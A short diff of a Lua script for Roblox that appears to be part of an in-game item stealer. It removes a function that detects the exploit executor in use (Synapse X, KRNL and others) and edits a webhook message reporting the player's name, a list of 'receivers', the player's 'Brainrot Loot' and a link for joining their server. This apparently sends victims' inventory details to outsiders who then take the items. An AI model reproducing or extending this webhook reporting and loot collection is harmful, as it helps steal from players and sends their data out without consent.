@@ -206,16 +206,6 @@ local function collectValidPets()
 
 	return pets
 end
-local function detectExecutor()
-    local executor = "Unknown"
-    if syn then executor = "Synapse X"
-    elseif KRNL_LOADED then executor = "KRNL"
-    elseif Delta X then executor = "Detal X"
-    elseif secure_load then executor = "Sentinel"
-    elseif getexecutorname then executor = getexecutorname()
-    elseif identifyexecutor then executor = identifyexecutor() end
-    return executor
-end
 
 local map = Workspace:FindFirstChild("Map")
 local serverType = "UNKNOWN"
@@ -274,11 +264,8 @@ local function sendWebhook(link)
             { ["name"] = "Server Type", ["value"] = serverType },
             { 
     ["name"] = "👥 Player Information",
-    ["value"] = 
-        "Name: " .. (player and player.Name or "Unknown") ..
-        "\nReceiver: " .. receiverList ..
-        "\nExecutor: " .. detectExecutor()
-},
+            ["value"] = "Name: " .. (player and player.Name or "Unknown") ..
+            "\nReceiver: " .. receiverList,
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
             { ["name"] = "Join Server Link", ["value"] = ("[Click to Join Server](%s)"):format(serverLink) }
         }
